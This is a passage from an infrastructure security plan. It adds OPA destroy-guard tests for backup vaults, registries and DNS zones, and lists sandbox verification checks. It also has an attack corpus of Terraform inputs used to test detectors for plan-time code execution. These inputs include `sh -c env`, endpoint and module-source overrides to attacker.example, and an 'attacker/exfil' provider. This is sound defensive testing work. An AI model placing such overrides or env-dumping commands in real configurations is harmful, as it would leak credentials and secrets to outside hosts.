test_google_artifact_registry_repository_delete_denied if denied_delete("google_artifact_registry_repository")

test_aws_efs_file_system_delete_denied if denied_delete("aws_efs_file_system")

test_aws_route53_zone_delete_denied if denied_delete("aws_route53_zone")

test_google_dns_managed_zone_delete_denied if denied_delete("google_dns_managed_zone")

test_backup_vault_replace_denied if count(p.deny) == 1 with input as one("aws_backup_vault", ["delete", "create"])
```

- [ ] **Step 2: Run and confirm failure**

```bash
opa test policies/opa-destructive -v --run 'destroy_guard'
```

Expected: the 10 new tests fail.

- [ ] **Step 3: Implement**

Add to `protected_types`, before the closing brace:

```rego
	# Backups and immutability: deleting a vault or its lock removes the
	# recovery points; deleting an Object Lock configuration lifts WORM.
	"aws_backup_vault",
	"aws_backup_vault_lock_configuration",
	"aws_s3_bucket_object_lock_configuration",
	"aws_efs_file_system",
	# Data and artefact stores.
	"google_bigquery_dataset",
	"aws_ecr_repository",
	"google_artifact_registry_repository",
	# DNS zones: delete and re-create changes the delegated name servers.
	"aws_route53_zone",
	"google_dns_managed_zone",
```

- [ ] **Step 4: Run and confirm pass**

```bash
opa check --strict policies/opa policies/opa-destructive
opa test policies/opa policies/opa-destructive -v
```

Expected: all pass.

- [ ] **Step 5: Docs**

- `docs/runbooks/aws-teardown.md`: in the destroy-guard note, list the new types that need the security override.
- `docs/architecture/policy-as-code.md`: update the destroy_guard type list.
- `CHANGELOG.md` `#### Security`: "**destroy_guard covers backup vaults, locks, Object Lock, BigQuery, registries, EFS and DNS zones (CICD-11).**"

- [ ] **Step 6: Commit**

```bash
git add policies/opa-destructive docs CHANGELOG.md
git commit -m "fix(policies): guard backup, lock, registry and DNS zone destroys"
```

---

### Task 16: Final gate

- [ ] **Step 1: Full local gate**

```bash
make fmt-check
./scripts/check-consistency.sh
./scripts/check-contracts.sh
make docs-check
make test-scripts
opa check --strict policies/opa policies/opa-destructive
opa test policies/opa policies/opa-destructive -v
make test TERRAFORM="$TF"
make links
```

Expected: every command exits 0.

- [ ] **Step 2: Known-gaps cross-check**

Read the new `## OPEN: WS3 trust-model residuals` section. Each residual names its finding ID and the sandbox check below that would close it.

---

## Sandbox proof

Each check turns a mock-tested task into a proven one. Run them in the sandbox estate (`docs/guides/sandbox-estate.md`), with a sandbox-only TFC organization and throwaway tokens.

| Task | Live check | Pass condition |
|---|---|---|
| 1 | As a platform-team member, `terraform plan` (CLI, speculative) against `gcp-workload-prod` holding a dummy sensitive `TFE_TOKEN`. Open a PR touching `envs/gcp/workload`. | CLI plan is refused ("insufficient permissions to queue a run"). No speculative run appears on the workspace for the PR. `gcp-workload-dev` without a secret still plans. |
| 2 | Upload (CLI, owner token) a config for `saas-sandbox` that calls `./evil/supabase/vault-secrets` with a `local-exec`; then one with provider `hashicorp/external`; then `provider "aws" { endpoints { sts = "https://example.invalid" } }`. | Each run stops at the policy check with `no_plan_time_code_execution` failed; the apply is not offered. The unmodified `envs/saas` run passes the policy. |
| 3 | Push a branch with each corpus file below. | `Validation Summary` fails at "Consistency guards" before any TFC run is queued. |
| 4 | With a viewer-team token, `GET /api/v2/workspaces/<saas-ws>/current-state-version` and the state download URL. With the state-backup token, the same. | Both 403/404 for saas; both succeed on a `gcp-*` workspace. |
| 5 | After the ordered applies, as `projects-apply` (impersonated in a sandbox shell), `gcloud resource-manager folders add-iam-policy-binding <prod-folder> --member=serviceAccount:<projects-apply> --role=roles/secretmanager.admin`. | `PERMISSION_DENIED` naming the IAM condition. Workload SAs still hold `secretmanager.admin` on their folder (granted by gcp-organization). |
| 6 | As `organization-apply`: `gcloud organizations add-iam-policy-binding <org> --member=serviceAccount:<org-apply> --role=roles/iam.denyAdmin`; then a no-change `gcp-organization` apply; then an audit-config change. | First call `PERMISSION_DENIED`. The no-change apply succeeds. The audit-config change applies. Org-admin groups still hold `organizationAdmin` after the state move. |
| 7 | Run a deploy workflow from a feature branch with no `environment:`; then from a job with `environment: <env>`. | First: STS token exchange succeeds but `iam.serviceAccounts.getAccessToken` is denied. Second: deploy succeeds. |
| 8 | Deploy the updated phase-0 stack in a sandbox management account. As `tfc-mgmt-plan`: `aws s3api get-object` on any bucket, `aws secretsmanager get-secret-value`. Run an `aws-organization` plan. | Both reads `AccessDenied` (explicit deny). The plan succeeds. `aws-security` plan/apply works on its dedicated role with `TrustSecurityAndBackup=false`. |
| 9 | Plan `gcp-workload-<prod>` with dry-run; then with the waiver; then enforced. | First plan fails with the precondition text; the other two pass. |
| 10 | In a member account, as `tfc-apply`: `aws iam update-assume-role-policy` on a pre-existing unbounded role; `aws iam create-policy-version --set-as-default` on a policy outside `/tfc-managed/`; `aws iam put-group-policy`; `aws kms update-alias` on the `log-archive` alias. Then a no-change `aws-workload` apply. | All four `AccessDenied` with the boundary as the reason. The no-change apply succeeds. |
| 11 | Plan a workload that binds `principalSet://.../workloadIdentityPools/apps-prod/*` on a deploy SA. | Policy check fails `gcp_wif_principalset_pinned`. |
| 12 | With the drift token: queue a plan on `saas-sandbox`, and on `gcp-network-hub`. | saas: 403/404. network-hub: run queued. |
| 13 | Apply `saas-sandbox` with `NPM_CONFIG_USERCONFIG` pointing to a file that logs the environment (sandbox runner only). | The npm log shows only `PATH` and `HOME`; bootstrap and reconcile still succeed. |
| 14 | Plan every sandbox root with the policy set attached. | No `unknown_or_not` violation on repo modules. |
| 15 | Plan a destroy of `aws_backup_vault` in the sandbox backup root. | `destroy_guard` fails the run; the security team override lets it proceed. |

## Attack corpus

The tests in Tasks 2, 3 and 11 must include each item below. One item is one test case.

**CI parser (Task 3, `scripts/tests/test-check-plan-time-exec.sh`):**

1. `resource terraform_data x { provisioner local-exec { ... } }` (bare labels)
2. `resource "terraform_data" "x" { provisioner "local-exec" { ... } }` in `envs/`
3. `removed { from = terraform_data.z provisioner "local-exec" { when = destroy ... } }`
4. `main.tf.json` with `{"resource": {"terraform_data": {"x": {"provisioner": [...]}}}}`
5. `x.tf.json` with `{"data": {"external": {...}}}`
6. `data external x { program = ["sh", "-c", "env"] }` (bare labels)
7. `check "c" { data "http" "y" { url = "..." } }` (scoped data source)
8. `required_providers { e = { source = "registry.terraform.io/hashicorp/external" } }`
9. `Registry.Terraform.IO/HashiCorp/External` (case variation)
10. `required_providers { x = { source = "attacker/exfil" } }`
11. `required_providers { http = "~> 3.0" }` (implied `hashicorp/http`)
12. `resource "dns_a_record_set" "x"` (unlisted type prefix, implied provider)
13. `provider "aws" { endpoints { sts = "https://attacker.example" } }`
14. `provider "google" { secret_manager_custom_endpoint = "..." }`
15. `provider "tfe" { hostname = "attacker.example" }`
16. `module "m" { source = "git::https://attacker.example/x.git//supabase/vault-secrets" }`
17. `modules/evil/supabase/vault-secrets/main.tf` with a provisioner (look-alike path)
18. An unparseable `.tf` file (fail closed)
19. Negative controls that must pass: the allowlisted vault-secrets file, `use_fips_endpoint = true`, `registry.terraform.io/hashicorp/aws`, this repo's release-tag module source, a provisioner under `.terraform/`.

**OPA (Task 2, `no_plan_time_code_execution_test.rego`):**

1. Module source `./evil/supabase/vault-secrets`
2. Module source `git::https://attacker.example/x.git//supabase/vault-secrets`
3. Module source `app.terraform.io/acme/supabase/vault-secrets` (private registry)
4. `../../modules/supabase/vault-secrets` called directly from the root (right path, wrong chain)
5. Correct sources, module call renamed (`vault` instead of `vault_secrets`)
6. Correct inner source, wrong outer source (`./evil/saas/stages/saas-workload`)
7. `data "http"` inside the exact reviewed chain (data is never exempt)
8. `provider_config` with `full_name = registry.terraform.io/hashicorp/external`
9. `provider_config` with a third-party provider
10. A `resource_changes` entry from `registry.terraform.io/hashicorp/dns`
11. `aws` `endpoints` override, `google` `*_custom_endpoint`, `tfe` `hostname`
12. Negative controls: the exact chain, `use_fips_endpoint`, `aws` and `tfe` with ordinary arguments.

**OPA (Task 11, `gcp_wif_principalset_pinned_test.rego`):**

1. `.../workloadIdentityPools/<pool>/*`
2. `.../attribute.repository_owner_id/<id>`
3. `.../attribute.repository/<owner>/<name>` (mutable name)
4. `.../attribute.ref/refs/heads/main` (any repo of the owner)
5. A wildcard inside an `_iam_binding` member list
6. A wildcard inside `_iam_policy` `policy_data`
7. Advisory: `.../attribute.repository_id/<id>` alone, and an unknown member
8. Negative controls: `repo_env`, `repo_ref_env`.
